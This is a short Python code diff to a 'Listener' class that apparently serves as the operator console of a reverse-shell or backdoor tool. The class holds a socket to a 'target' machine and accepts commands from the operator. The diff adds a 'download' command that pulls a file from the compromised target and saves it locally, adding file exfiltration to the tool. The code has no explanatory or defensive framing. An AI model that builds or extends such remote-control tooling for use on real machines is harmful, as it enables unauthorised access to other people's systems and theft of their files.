@@ -1,5 +1,6 @@
 import socket
 import json
+import os
 
 
 class Listener:
@@ -24,6 +25,14 @@ class Listener:
         if command_split[0] == "quit":
             self.target.close()
             exit()
+        elif command_split[0] == "download" and command_split[1] is not None:
+            # write a file
+            receive = self.reliable_receive()
+            file_name = os.path.basename(command_split[1])
+            with open(file_name, 'wb') as file:
+                file.write(receive.encode())
+                file.close()
+                return f"File saved {file_name}"
         else:
             receive = self.reliable_receive()
             return receive
